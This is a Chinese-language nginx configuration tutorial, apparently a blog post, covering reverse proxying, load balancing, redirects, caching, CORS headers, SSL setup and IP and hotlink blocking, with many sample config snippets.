pentium, pentiumpro\n\n\n–with-openssl&#x3D;DIR\nSet path to OpenSSL library sources\n\n\n–with-openssl-opt&#x3D;OPTIONS\nSet additional options for OpenSSL building\n\n\n–with-debug\n启用调试日志\n\n\n–add-module&#x3D;PATH\nAdd in a third-party module found in directory PATH\n\n\n六、配置\n在Centos 默认配置文件在 /usr/local/nginx-1.5.1/conf/nginx.conf 我们要在这里配置一些文件。nginx.conf是主配置文件，由若干个部分组成，每个大括号&#123;&#125;表示一个部分。每一行指令都由分号结束;，标志着一行的结束。\n\n6.1 常用正则\n\n\n正则\n说明\n正则\n说明\n\n\n\n.\n匹配除换行符以外的任意字符\n$\n匹配字符串的结束\n\n\n?\n重复0次或1次\n&#123;n&#125;\n重复n次\n\n\n+\n重复1次或更多次\n&#123;n,&#125;\n重复n次或更多次\n\n\n*\n重复0次或更多次\n[c]\n匹配单个字符c\n\n\n\\d\n匹配数字\n[a-z]\n匹配a-z小写字母的任意一个\n\n\n^\n匹配字符串的开始\n-\n-\n\n\n6.2 全局变量\n\n\n变量\n说明\n变量\n说明\n\n\n\n$args\n这个变量等于请求行中的参数，同$query_string\n$remote_port\n客户端的端口。\n\n\n$content_length\n请求头中的Content-length字段。\n$remote_user\n已经经过Auth Basic Module验证的用户名。\n\n\n$content_type\n请求头中的Content-Type字段。\n$request_filename\n当前请求的文件路径，由root或alias指令与URI请求生成。\n\n\n$document_root\n当前请求在root指令中指定的值。\n$scheme\nHTTP方法（如http，https）。\n\n\n$host\n请求主机头字段，否则为服务器名称。\n$server_protocol\n请求使用的协议，通常是HTTP/1.0或HTTP/1.1。\n\n\n$http_user_agent\n客户端agent信息\n$server_addr\n服务器地址，在完成一次系统调用后可以确定这个值。\n\n\n$http_cookie\n客户端cookie信息\n$server_name\n服务器名称。\n\n\n$limit_rate\n这个变量可以限制连接速率。\n$server_port\n请求到达服务器的端口号。\n\n\n$request_method\n客户端请求的动作，通常为GET或POST。\n$request_uri\n包含请求参数的原始URI，不包含主机名，如：/foo/bar.php?arg=baz。\n\n\n$remote_addr\n客户端的IP地址。\n$uri\n不带请求参数的当前URI，$uri不包含主机名，如/foo/bar.html。\n\n\n$document_uri\n与$uri相同。\n-\n-\n\n\n例如请求：http://localhost:3000/test1/test2/test.php\n$host：localhost  $server_port：3000  $request_uri：/test1/test2/test.php  $document_uri：/test1/test2/test.php  $document_root：/var/www/html  $request_filename：/var/www/html/test1/test2/test.php\n\n6.3 符号参考\n\n\n符号\n说明\n符号\n说明\n符号\n说明\n\n\n\nk,K\n千字节\nm,M\n兆字节\nms\n毫秒\n\n\ns\n秒\nm\n分钟\nh\n小时\n\n\nd\n日\nw\n周\nM\n一个月, 30天\n\n\n\n例如，”8k”，”1m” 代表字节数计量。\n例如，”1h 30m”，”1y 6M”。代表 “1小时 30分”，”1年零6个月”。\n\n6.4 配置文件\nnginx 的配置系统由一个主配置文件和其他一些辅助的配置文件构成。这些配置文件均是纯文本文件，全部位于 nginx 安装目录下的 conf 目录下。\n指令由 nginx 的各个模块提供，不同的模块会提供不同的指令来实现配置。指令除了 Key-Value 的形式，还有作用域指令。\nnginx.conf 中的配置信息，根据其逻辑上的意义，对它们进行了分类，也就是分成了多个作用域，或者称之为配置指令上下文。不同的作用域含有一个或者多个配置项。\n\n\n下面的这些上下文指令是用的比较多：\n\n\n\n\nDirective\nDescription\nContains Directive\n\n\n\nmain\nnginx 在运行时与具体业务功能（比如 http 服务或者 email服务代理）无关的一些参数，比如工作进程数，运行的身份等。\nuser, worker_processes, error_log, events, http, mail\n\n\nhttp\n与提供 http 服务相关的一些配置参数。例如：是否使用 keepalive啊，是否使用gzip 进行压缩等。\nserver\n\n\nserver\nhttp 服务上支持若干虚拟主机。每个虚拟主机一个对应的 server 配置项，配置项里面包含该虚拟主机相关的配置。在提供 mail 服务的代理时，也可以建立若干 server. 每个 server 通过监听的地址来区分。\nlisten, server_name,access_log, location, protocol, proxy, smtp_auth, xclient\n\n\nlocation\nhttp 服务中，某些特定的 URL 对应的一系列配置项。\nindex, root\n\n\nmail\n实现email相关的 SMTP/IMAP/POP3 代理时，共享的一些配置项（因为可能实现多个代理，工作在多个监听地址上）。\nserver,http, imap_capabilities\n\n\ninclude\n以便增强配置文件的可读性，使得部分配置文件可以重新使用。\n-\n\n\nvalid_referers\n用来校验Http请求头Referer是否有效。\n-\n\n\ntry_files\n用在server部分，不过最常见的还是用在location部分，它会按照给定的参数顺序进行尝试，第一个被匹配到的将会被使用。\n-\n\n\nif\n当在location块中使用if指令，在某些情况下它并不按照预期运行，一般来说避免使用if指令。\n-\n\n\n\n例如我们再 nginx.conf 里面引用两个配置 vhost/example.com.conf和 vhost/gitlab.com.conf 它们都被放在一个我自己新建的目录 vhost下面。nginx.conf 配置如下：\n\nworker_processes  1;events &#123;    worker_connections  1024;&#125;http &#123;    include       mime.types;    default_type  application/octet-stream;    #log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;    #                  &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;    #                  &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;    #access_log  logs/access.log  main;    sendfile        on;    #tcp_nopush     on;    #keepalive_timeout  0;    keepalive_timeout  65;    #gzip  on;    server &#123;        listen       80;        server_name  localhost;        location / &#123;            root   html;            index  index.html index.htm;        &#125;        error_page   500 502 503 504  /50x.html;        location = /50x.html &#123;            root   html;        &#125;    &#125;    include  vhost/example.com.conf;    include  vhost/gitlab.com.conf;&#125;\n\n\n简单的配置: example.com.conf\n\nserver &#123;    #侦听的80端口    listen       80;    server_name  baidu.com app.baidu.com; # 这里指定域名    index        index.html index.htm;    # 这里指定默认入口页面    root /home/www/app.baidu.com;         # 这里指定目录&#125;\n\n6.5 内置预定义变量\nNginx提供了许多预定义的变量，也可以通过使用set来设置变量。你可以在if中使用预定义变量，也可以将它们传递给代理服务器。以下是一些常见的预定义变量，更多详见\n\n\n\n\n变量名称\n值\n\n\n\n$args_name\n在请求中的name参数\n\n\n$args &#96;\n所有请求参数\n\n\n$query_string\n$args的别名\n\n\n$content_length\n请求头Content-Length的值\n\n\n$content_type\n请求头Content-Type的值\n\n\n$host\n如果当前有Host，则为请求头Host的值；如果没有这个头，那么该值等于匹配该请求的server_name的值\n\n\n$remote_addr\n客户端的IP地址\n\n\n$request\n完整的请求，从客户端收到，包括Http请求方法、URI、Http协议、头、请求体\n\n\n$request_uri\n完整请求的URI，从客户端来的请求，包括参数\n\n\n$scheme\n当前请求的协议\n\n\n$uri\n当前请求的标准化URI\n\n\n6.6 反向代理\n反向代理是一个Web服务器，它接受客户端的连接请求，然后将请求转发给上游服务器，并将从服务器得到的结果返回给连接的客户端。下面简单的反向代理的例子：\n\nserver &#123;    listen       80;                                                          server_name  localhost;                                                client_max_body_size 1024M;  # 允许客户端请求的最大单文件字节数  location / &#123;    proxy_pass                         http://localhost:8080;    proxy_set_header Host              $host:$server_port;    proxy_set_header X-Forwarded-For   $remote_addr; # HTTP的请求端真实的IP    proxy_set_header X-Forwarded-Proto $scheme;      # 为了正确地识别实际用户发出的协议是 http 还是 https  &#125;&#125;\n\n\n复杂的配置: gitlab.com.conf。\n\nserver &#123;    #侦听的80端口    listen       80;    server_name  git.example.cn;    location / &#123;        proxy_pass   http://localhost:3000;        #以下是一些反向代理的配置可删除        proxy_redirect             off;        #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP        proxy_set_header           Host $host;        client_max_body_size       10m; #允许客户端请求的最大单文件字节数        client_body_buffer_size    128k; #缓冲区代理缓冲用户端请求的最大字节数        proxy_connect_timeout      300; #nginx跟后端服务器连接超时时间(代理连接超时)        proxy_send_timeout         300; #后端服务器数据回传时间(代理发送超时)        proxy_read_timeout         300; #连接成功后，后端服务器响应时间(代理接收超时)        proxy_buffer_size          4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小        proxy_buffers              4 32k; #proxy_buffers缓冲区，网页平均在32k以下的话，这样设置        proxy_busy_buffers_size    64k; #高负荷下缓冲大小（proxy_buffers*2）    &#125;&#125;\n\n\n代理到上游服务器的配置中，最重要的是proxy_pass指令。以下是代理模块中的一些常用指令：\n\n\n\n\n指令\n说明\n\n\n\nproxy_connect_timeout\nNginx从接受请求至连接到上游服务器的最长等待时间\n\n\nproxy_send_timeout\n后端服务器数据回传时间(代理发送超时)\n\n\nproxy_read_timeout\n连接成功后，后端服务器响应时间(代理接收超时)\n\n\nproxy_cookie_domain\n替代从上游服务器来的Set-Cookie头的domain属性\n\n\nproxy_cookie_path\n替代从上游服务器来的Set-Cookie头的path属性\n\n\nproxy_buffer_size\n设置代理服务器（nginx）保存用户头信息的缓冲区大小\n\n\nproxy_buffers\nproxy_buffers缓冲区，网页平均在多少k以下\n\n\nproxy_set_header\n重写发送到上游服务器头的内容，也可以通过将某个头部的值设置为空字符串，而不发送某个头部的方法实现\n\n\nproxy_ignore_headers\n这个指令禁止处理来自代理服务器的应答。\n\n\nproxy_intercept_errors\n使nginx阻止HTTP应答代码为400或者更高的应答。\n\n\n6.7 负载均衡\nupstream指令启用一个新的配置区段，在该区段定义一组上游服务器。这些服务器可能被设置不同的权重，也可能出于对服务器进行维护，标记为down。\n\nupstream gitlab &#123;    ip_hash;    # upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。    server 192.168.122.11:8081 ;    server 127.0.0.1:82 weight=3;    server 127.0.0.1:83 weight=3 down;    server 127.0.0.1:84 weight=3; max_fails=3  fail_timeout=20s;    server 127.0.0.1:85 weight=4;;    keepalive 32;&#125;server &#123;    #侦听的80端口    listen       80;    server_name  git.example.cn;    location / &#123;        proxy_pass   http://gitlab;    #在这里设置一个代理，和upstream的名字一样        #以下是一些反向代理的配置可删除        proxy_redirect             off;        #后端的Web服务器可以通过X-Forwarded-For获取用户真实IP        proxy_set_header           Host $host;        proxy_set_header           X-Real-IP $remote_addr;        proxy_set_header           X-Forwarded-For $proxy_add_x_forwarded_for;        client_max_body_size       10m;  #允许客户端请求的最大单文件字节数        client_body_buffer_size    128k; #缓冲区代理缓冲用户端请求的最大字节数        proxy_connect_timeout      300;  #nginx跟后端服务器连接超时时间(代理连接超时)        proxy_send_timeout         300;  #后端服务器数据回传时间(代理发送超时)        proxy_read_timeout         300;  #连接成功后，后端服务器响应时间(代理接收超时)        proxy_buffer_size          4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小        proxy_buffers              4 32k;# 缓冲区，网页平均在32k以下的话，这样设置        proxy_busy_buffers_size    64k; #高负荷下缓冲大小（proxy_buffers*2）        proxy_temp_file_write_size 64k; #设定缓存文件夹大小，大于这个值，将从upstream服务器传    &#125;&#125;\n\n\n每个请求按时间顺序逐一分配到不同的后端服务器，如果后端服务器down掉，能自动剔除。\n\n负载均衡：\n\nupstream模块能够使用3种负载均衡算法：轮询、IP哈希、最少连接数。\n\n轮询：\n\n默认情况下使用轮询算法，不需要配置指令来激活它，它是基于在队列中谁是下一个的原理确保访问均匀地分布到每个上游服务器；\n\nIP哈希：\n\n通过ip_hash指令来激活，Nginx通过IPv4地址的前3个字节或者整个IPv6地址作为哈希键来实现，同一个IP地址总是能被映射到同一个上游服务器；\n\n最少连接数：\n\n通过least_conn指令来激活，该算法通过选择一个活跃数最少的上游服务器进行连接。如果上游服务器处理能力不同，可以通过给server配置weight权重来说明，该算法将考虑到不同服务器的加权最少连接数。\n\n6.7.1 RR简单配置\n\n这里我配置了2台服务器，当然实际上是一台，只是端口不一样而已，而8081的服务器是不存在的，也就是说访问不到，但是我们访问 http://localhost 的时候，也不会有问题，会默认跳转到http://localhost:8080具体是因为Nginx会自动判断服务器的状态，如果服务器处于不能访问（服务器挂了），就不会跳转到这台服务器，所以也避免了一台服务器挂了影响使用的情况，由于Nginx默认是RR策略，所以我们不需要其他更多的设置\n\nupstream test &#123;    server localhost:8080;    server localhost:8081;&#125;server &#123;    listen       81;    server_name  localhost;    client_max_body_size 1024M;     location / &#123;        proxy_pass http://test;        proxy_set_header Host $host:$server_port;    &#125;&#125;\n\n负载均衡的核心代码为\nupstream test &#123;    server localhost:8080;    server localhost:8081;&#125;\n\n6.7.2 权重\n指定轮询几率，weight和访问比率成正比，用于后端服务器性能不均的情况。 例如\n\nupstream test &#123;    server localhost:8080 weight=9;    server localhost:8081 weight=1;&#125;\n\n\n那么10次一般只会有1次会访问到8081，而有9次会访问到8080\n\n6.7.3 ip_hash\n上面的2种方式都有一个问题，那就是下一个请求来的时候请求可能分发到另外一个服务器，当我们的程序不是无状态的时候（采用了session保存数据），这时候就有一个很大的很问题了，比如把登录信息保存到了session中，那么跳转到另外一台服务器的时候就需要重新登录了，所以很多时候我们需要一个客户只访问一个服务器，那么就需要用iphash了，iphash的每个请求按访问ip的hash结果分配，这样每个访客固定访问一个后端服务器，可以解决session的问题。\n\nupstream test &#123;    ip_hash;    server localhost:8080;    server localhost:8081;&#125;\n\n6.7.4 fair\n这是个第三方模块，按后端服务器的响应时间来分配请求，响应时间短的优先分配。\n\nupstream backend &#123;    fair;    server localhost:8080;    server localhost:8081;&#125;\n\n6.7.5 url_hash\n这是个第三方模块，按访问url的hash结果来分配请求，使每个url定向到同一个后端服务器，后端服务器为缓存时比较有效。 在upstream中加入hash语句，server语句中不能写入weight等其他的参数，hash_method是使用的hash算法\n\nupstream backend &#123;    hash $request_uri;    hash_method crc32;    server localhost:8080;    server localhost:8081;&#125;\n\n\n以上5种负载均衡各自适用不同情况下使用，所以可以根据实际情况选择使用哪种策略模式，不过fair和url_hash需要安装第三方模块才能使用\n\nserver指令可选参数：\n\nweight：设置一个服务器的访问权重，数值越高，收到的请求也越多；\nfail_timeout：在这个指定的时间内服务器必须提供响应，如果在这个时间内没有收到响应，那么服务器将会被标记为down状态；\nmax_fails：设置在fail_timeout时间之内尝试对一个服务器连接的最大次数，如果超过这个次数，那么服务器将会被标记为down;\ndown：标记一个服务器不再接受任何请求；\nbackup：一旦其他服务器宕机，那么有该标记的机器将会接收请求。\n\nkeepalive指令：\n\nNginx服务器将会为每一个worker进行保持同上游服务器的连接。\n\n6.8 屏蔽ip\n在nginx的配置文件nginx.conf中加入如下配置，可以放到http, server, location, limit_except语句块，需要注意相对路径，本例当中nginx.conf，blocksip.conf在同一个目录中。\n\ninclude blockip.conf;\n\n\n在blockip.conf里面输入内容，如：\n\ndeny 165.91.122.67;deny IP;   # 屏蔽单个ip访问allow IP;  # 允许单个ip访问deny all;  # 屏蔽所有ip访问allow all; # 允许所有ip访问deny 123.0.0.0/8   # 屏蔽整个段即从123.0.0.1到123.255.255.254访问的命令deny 124.45.0.0/16 # 屏蔽IP段即从123.45.0.1到123.45.255.254访问的命令deny 123.45.6.0/24 # 屏蔽IP段即从123.45.6.1到123.45.6.254访问的命令# 如果你想实现这样的应用，除了几个IP外，其他全部拒绝allow 1.1.1.1; allow 1.1.1.2;deny all;\n\n七、第三方模块安装方法./configure --prefix=/你的安装目录  --add-module=/第三方模块目录\n\n八、重定向\npermanent 永久性重定向。请求日志中的状态码为301\nredirect 临时重定向。请求日志中的状态码为302\n\n8.1 重定向整个网站server &#123;    server_name old-site.com    return 301 $scheme://new-site.com$request_uri;&#125;\n\n8.2 重定向单页server &#123;    location = /oldpage.html &#123;        return 301 http://example.org/newpage.html;    &#125;&#125;\n\n8.3 重定向整个子路径location /old-site &#123;    rewrite ^/old-site/(.*) http://example.org/new-site/$1 permanent;&#125;\n\n九、性能9.1 内容缓存\n允许浏览器基本上永久地缓存静态内容。 Nginx将为您设置Expires和Cache-Control头信息。\n\nlocation /static &#123;    root /data;    expires max;&#125;\n\n\n如果要求浏览器永远不会缓存响应（例如用于跟踪请求），请使用-1。\n\nlocation = /empty.gif &#123;    empty_gif;    expires -1;&#125;\n\n9.2 Gzip压缩gzip  on;gzip_buffers 16 8k;gzip_comp_level 6;gzip_http_version 1.1;gzip_min_length 256;gzip_proxied any;gzip_vary on;gzip_types    text/xml application/xml application/atom+xml application/rss+xml application/xhtml+xml image/svg+xml    text/javascript application/javascript application/x-javascript    text/x-json application/json application/x-web-app-manifest+json    text/css text/plain text/x-component    font/opentype application/x-font-ttf application/vnd.ms-fontobject    image/x-icon;gzip_disable  &quot;msie6&quot;;\n\n9.3 打开文件缓存open_file_cache max=1000 inactive=20s;open_file_cache_valid 30s;open_file_cache_min_uses 2;open_file_cache_errors on;\n\n9.4 SSL缓存ssl_session_cache shared:SSL:10m;ssl_session_timeout 10m;\n\n9.5 上游Keepaliveupstream backend &#123;    server 127.0.0.1:8080;    keepalive 32;&#125;server &#123;    ...    location /api/ &#123;        proxy_pass http://backend;        proxy_http_version 1.1;        proxy_set_header Connection &quot;&quot;;    &#125;&#125;\n\n9.6 监控\n使用ngxtop实时解析nginx访问日志，并且将处理结果输出到终端，功能类似于系统命令top。所有示例都读取nginx配置文件的访问日志位置和格式。如果要指定访问日志文件和&#x2F;或日志格式，请使用-f和-a选项。\n注意：在nginx配置中/usr/local/nginx/conf/nginx.conf日志文件必须是绝对路径。\n\n# 安装 ngxtoppip install ngxtop# 实时状态ngxtop# 状态为404的前10个请求的路径：ngxtop top request_path --filter &#x27;status == 404&#x27;# 发送总字节数最多的前10个请求ngxtop --order-by &#x27;avg(bytes_sent) * count&#x27;# 排名前十位的IP，例如，谁攻击你最多ngxtop --group-by remote_addr# 打印具有4xx或5xx状态的请求，以及status和http refererngxtop -i &#x27;status &gt;= 400&#x27; print request status http_referer# 由200个请求路径响应发送的平均正文字节以&#x27;foo&#x27;开始：ngxtop avg bytes_sent --filter &#x27;status == 200 and request_path.startswith(&quot;foo&quot;)&#x27;# 使用“common”日志格式从远程机器分析apache访问日志ssh remote tail -f /var/log/apache2/access.log | ngxtop -f common\n\n十、常见使用场景10.1 跨域问题\n在工作中，有时候会遇到一些接口不支持跨域，这时候可以简单的添加add_headers来支持cors跨域。配置如下：\n\nserver &#123;  listen 80;  server_name api.xxx.com;      add_header &#x27;Access-Control-Allow-Origin&#x27; &#x27;*&#x27;;  add_header &#x27;Access-Control-Allow-Credentials&#x27; &#x27;true&#x27;;  add_header &#x27;Access-Control-Allow-Methods&#x27; &#x27;GET,POST,HEAD&#x27;;  location / &#123;    proxy_pass http://127.0.0.1:3000;    proxy_set_header X-Real-IP $remote_addr;    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;    proxy_set_header Host  $http_host;      &#125; &#125;\n\n\n上面更改头信息，还有一种，使用 rewrite 指令重定向URI来解决跨域问题。\n\nupstream test &#123;  server 127.0.0.1:8080;  server localhost:8081;&#125;server &#123;  listen 80;  server_name api.xxx.com;  location / &#123;     root  html;                   #去请求../html文件夹里的文件    index  index.html index.htm;  #首页响应地址  &#125;  # 用于拦截请求，匹配任何以 /api/开头的地址，  # 匹配符合以后，停止往下搜索正则。  location ^~/api/&#123;     # 代表重写拦截进来的请求，并且只能对域名后边的除去传递的参数外的字符串起作用，    # 例如www.a.com/proxy/api/msg?meth=1&amp;par=2重写，只对/proxy/api/msg重写。    # rewrite后面的参数是一个简单的正则 ^/api/(.*)$，    # $1代表正则中的第一个()，$2代表第二个()的值，以此类推。    rewrite ^/api/(.*)$ /$1 break;        # 把请求代理到其他主机     # 其中 http://www.b.com/ 写法和 http://www.b.com写法的区别如下    # 如果你的请求地址是他 http://server/html/test.jsp    # 配置一： http://www.b.com/ 后面有“/”     #         将反向代理成 http://www.b.com/html/test.jsp 访问    # 配置一： http://www.b.com 后面没有有“/”     #         将反向代理成 http://www.b.com/test.jsp 访问    proxy_pass http://test;    # 如果 proxy_pass  URL 是 http://a.xx.com/platform/ 这种情况    # proxy_cookie_path应该设置成 /platform/ / (注意两个斜杠之间有空格)。    proxy_cookie_path /platfrom/ /;    # http://nginx.org/en/docs/http/ngx_http_proxy_module.html#proxy_pass_header    # 设置 Cookie 头通过    proxy_pass_header Set-Cookie;  &#125; &#125;\n\n10.2 跳转到带www的域上面server &#123;    listen 80;    # 配置正常的带www的域名    server_name www.wangchujiang.com;    root /home/www/wabg/download;    location / &#123;        try_files $uri $uri/ /index.html =404;    &#125;&#125;server &#123;    # 这个要放到下面，    # 将不带www的 wangchujiang.com 永久性重定向到  https://www.wangchujiang.com    server_name wangchujiang.com;    rewrite ^(.*) https://www.wangchujiang.com$1 permanent;&#125;\n\n10.3 代理转发upstream server-api&#123;    # api 代理服务地址    server 127.0.0.1:3110;    &#125;upstream server-resource&#123;    # 静态资源 代理服务地址    server 127.0.0.1:3120;&#125;server &#123;    listen       3111;    server_name  localhost;      # 这里指定域名    root /home/www/server-statics;    # 匹配 api 路由的反向代理到API服务    location ^~/api/ &#123;        rewrite ^/(.*)$ /$1 break;        proxy_pass http://server-api;    &#125;    # 假设这里验证码也在API服务中    location ^~/captcha &#123;        rewrite ^/(.*)$ /$1 break;        proxy_pass http://server-api;    &#125;    # 假设你的图片资源全部在另外一个服务上面    location ^~/img/ &#123;        rewrite ^/(.*)$ /$1 break;        proxy_pass http://server-resource;    &#125;    # 路由在前端，后端没有真实路由，在路由不存在的 404状态的页面返回 /index.html    # 这个方式使用场景，你在写React或者Vue项目的时候，没有真实路由    location / &#123;        try_files $uri $uri/ /index.html =404;        #                               ^ 空格很重要    &#125;&#125;\n\n10.4 代理转发连接替换location ^~/api/upload &#123;    rewrite ^/(.*)$ /wfs/v1/upload break;    proxy_pass http://wfs-api;&#125;\n\n10.5 ssl配置\n超文本传输安全协议（缩写：HTTPS，英语：Hypertext Transfer Protocol Secure）是超文本传输协议和SSL&#x2F;TLS的组合，用以提供加密通讯及对网络服务器身份的鉴定。HTTPS连接经常被用于万维网上的交易支付和企业信息系统中敏感信息的传输。HTTPS不应与在RFC 2660中定义的安全超文本传输协议（S-HTTP）相混。HTTPS 目前已经是所有注重隐私和安全的网站的首选，随着技术的不断发展，HTTPS 网站已不再是大型网站的专利，所有普通的个人站长和博客均可以自己动手搭建一个安全的加密的网站。\n\n创建SSL证书，如果你购买的证书，就可以直接下载\n\n\nsudo mkdir /etc/nginx/ssl# 创建了有效期100年，加密强度为RSA2048的SSL密钥key和X509证书文件。sudo openssl req -x509 -nodes -days 36500 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key -out /etc/nginx/ssl/nginx.crt# 上面命令，会有下面需要填写内容Country Name (2 letter code) [AU]:USState or Province Name (full name) [Some-State]:New YorkLocality Name (eg, city) []:New York CityOrganization Name (eg, company) [Internet Widgits Pty Ltd]:Bouncy Castles, Inc.Organizational Unit Name (eg, section) []:Ministry of Water SlidesCommon Name (e.g. server FQDN or YOUR name) []:your_domain.comEmail Address []:admin@your_domain.com\n\n\n创建自签证书\n\n首先，创建证书和私钥的目录# mkdir -p /etc/nginx/cert# cd /etc/nginx/cert创建服务器私钥，命令会让你输入一个口令：# openssl genrsa -des3 -out nginx.key 2048创建签名请求的证书（CSR）：# openssl req -new -key nginx.key -out nginx.csr在加载SSL支持的Nginx并使用上述私钥时除去必须的口令：# cp nginx.key nginx.key.org# openssl rsa -in nginx.key.org -out nginx.key最后标记证书使用上述私钥和CSR：# openssl x509 -req -days 365 -in nginx.csr -signkey nginx.key -out nginx.crt\n\n查看目前nginx编译选项\nsbin/nginx -V\n\n输出下面内容\nnginx version: nginx/1.7.8built by gcc 4.4.7 20120313 (Red Hat 4.4.7-4) (GCC)TLS SNI support enabledconfigure arguments: --prefix=/usr/local/nginx-1.7.8 --with-http_ssl_module --with-http_spdy_module --with-http_stub_status_module --with-pcre\n\n如果依赖的模块不存在，可以进入安装目录，输入下面命令重新编译安装。\n./configure --prefix=/usr/local/nginx --with-http_stub_status_module --with-http_ssl_module\n\n运行完成之后还需要make (不用make install)\n# 备份nginx的二进制文件cp -rf /usr/local/nginx/sbin/nginx　 /usr/local/nginx/sbin/nginx.bak# 覆盖nginx的二进制文件cp -rf objs/nginx   /usr/local/nginx/sbin/\n\nHTTPS server\nserver &#123;    listen       443 ssl;    server_name  localhost;    ssl_certificate /etc/nginx/ssl/nginx.crt;    ssl_certificate_key /etc/nginx/ssl/nginx.key;    # 禁止在header中出现服务器版本，防止黑客利用版本漏洞攻击    server_tokens off;    # 设置ssl/tls会话缓存的类型和大小。如果设置了这个参数一般是shared，buildin可能会参数内存碎片，默认是none，和off差不多，停用缓存。如shared:SSL:10m表示我所有的nginx工作进程共享ssl会话缓存，官网介绍说1M可以存放约4000个sessions。     ssl_session_cache    shared:SSL:1m;     # 客户端可以重用会话缓存中ssl参数的过期时间，内网系统默认5分钟太短了，可以设成30m即30分钟甚至4h。    ssl_session_timeout  5m;     # 选择加密套件，不同的浏览器所支持的套件（和顺序）可能会不同。    # 这里指定的是OpenSSL库能够识别的写法，你可以通过 openssl -v cipher &#x27;RC4:HIGH:!aNULL:!MD5&#x27;（后面是你所指定的套件加密算法） 来看所支持算法。    ssl_ciphers  HIGH:!aNULL:!MD5;    # 设置协商加密算法时，优先使用我们服务端的加密套件，而不是客户端浏览器的加密套件。    ssl_prefer_server_ciphers  on;    location / &#123;        root   html;        index  index.html index.htm;    &#125;&#125;\n\n10.6 强制将http重定向到httpsserver &#123;    listen       80;    server_name  example.com;    rewrite ^ https://$http_host$request_uri? permanent;    # 强制将http重定向到https    # 在错误页面和“服务器”响应头字段中启用或禁用发射nginx版本。 防止黑客利用版本漏洞攻击    server_tokens off;&#125;\n\n10.7 两个虚拟主机\n纯静态-html 支持\n\nhttp &#123;    server &#123;        listen          80;        server_name     www.domain1.com;        access_log      logs/domain1.access.log main;        location / &#123;            index index.html;            root  /var/www/domain1.com/htdocs;        &#125;    &#125;    server &#123;        listen          80;        server_name     www.domain2.com;        access_log      logs/domain2.access.log main;        location / &#123;            index index.html;            root  /var/www/domain2.com/htdocs;        &#125;    &#125;&#125;\n\n10.8 虚拟主机标准配置http &#123;  server &#123;    listen          80 default;    server_name     _ *;    access_log      logs/default.access.log main;    location / &#123;       index index.html;       root  /var/www/default/htdocs;    &#125;  &#125;&#125;\n\n10.9 防盗链location ~* \\.(gif|jpg|png|swf|flv)$ &#123;   root html   valid_referers none blocked *.nginxcn.com;   if ($invalid_referer) &#123;     rewrite ^/ www.nginx.cn     #return 404;   &#125;&#125;\n\n10.10虚拟目录配置alias指定的目录是准确的，root是指定目录的上级目录，并且该上级目录要含有location指定名称的同名目录。\nlocation /img/ &#123;    alias /var/www/image/;&#125;# 访问/img/目录里面的文件时，ningx会自动去/var/www/image/目录找文件location /img/ &#123;    root /var/www/image;&#125;# 访问/img/目录下的文件时，nginx会去/var/www/image/img/目录下找文件。]\n\n10.11 防盗图配置location ~ \\/public\\/(css|js|img)\\/.*\\.(js|css|gif|jpg|jpeg|png|bmp|swf) &#123;    valid_referers none blocked *.jslite.io;    if ($invalid_referer) &#123;        rewrite ^/  http://wangchujiang.com/piratesp.png;    &#125;&#125;\n\n10.12 屏蔽.git等文件location ~ (.git|.gitattributes|.gitignore|.svn) &#123;    deny all;&#125;\n\n域名路径加不加需要都能正常访问http://wangchujiang.com/api/index.php?a=1&amp;name=wcj                                  ^ 有后缀http://wangchujiang.com/api/index?a=1&amp;name=wcj                                 ^ 没有后缀\n\n\nnginx rewrite规则如下：\n\nrewrite ^/(.*)/$ /index.php?/$1 permanent;if (!-d $request_filename)&#123;        set $rule_1 1$rule_1;&#125;if (!-f $request_filename)&#123;        set $rule_1 2$rule_1;&#125;if ($rule_1 = &quot;21&quot;)&#123;        rewrite ^/ /index.php last;&#125;\n\n十一、错误问题The plain HTTP request was sent to HTTPS port\n\n\n解决办法，fastcgi_param HTTPS $https if_not_empty 添加这条规则，\n\nserver &#123;    listen 443 ssl; # 注意这条规则    server_name  my.domain.com;        fastcgi_param HTTPS $https if_not_empty;    fastcgi_param HTTPS on;    ssl_certificate /etc/ssl/certs/your.pem;    ssl_certificate_key /etc/ssl/private/your.key;    location / &#123;        # Your config here...    &#125;&#125;\n\n十二、精品文章参考\n负载均衡原理的解析\nNginx泛域名解析，实现多个二级域名\n深入 NGINX: 我们如何设计性能和扩展\nInside NGINX: How We Designed for Performance &amp; Scale\nNginx开发从入门到精通\nNginx的优化与防盗链\n实战开发一个Nginx扩展 (Nginx Module)\nNginx+Keepalived(双机热备)搭建高可用负载均衡环境(HA)\nNginx 平滑升级\nNginx最新模块—ngx_http_mirror_module分析可以做版本发布前的预先验证，进行流量放大后的压测等等\n\n","categories":["liunx"],"tags":["nginx"]}]